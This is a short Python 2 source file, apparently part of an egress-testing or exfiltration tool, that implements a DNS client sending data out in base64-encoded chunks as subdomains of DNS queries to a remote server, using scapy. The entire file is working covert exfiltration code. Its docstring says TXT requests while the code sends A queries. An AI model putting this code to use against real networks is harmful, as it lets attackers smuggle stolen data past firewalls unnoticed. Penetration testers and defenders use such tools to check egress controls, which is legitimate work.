'''

This is a DNS client that transmits data within DNS TXT requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

'''

import base64
import socket
import sys
from common import helpers
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns_resolved"
        self.length = 20
        self.remote_server = cli_object.ip

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        while (byte_reader < len(data_to_transmit) + self.length):
            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])

            # calcalate total packets
            if ((len(data_to_transmit) % self.length) == 0):
                total_packets = len(data_to_transmit) / self.length
            else:
                total_packets = (len(data_to_transmit) / self.length) + 1

            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)

            # Craft the packet with scapy
            try:
                send(IP(dst=encoded_data + "." + self.remote_server)/UDP()/DNS(
                    id=15, opcode=0,
                    qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")],
                    verbose=False))
            except gaierror:
                pass
            except KeyboardInterrupt:
                print "[*] Shutting down..."
                sys.exit()

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        return
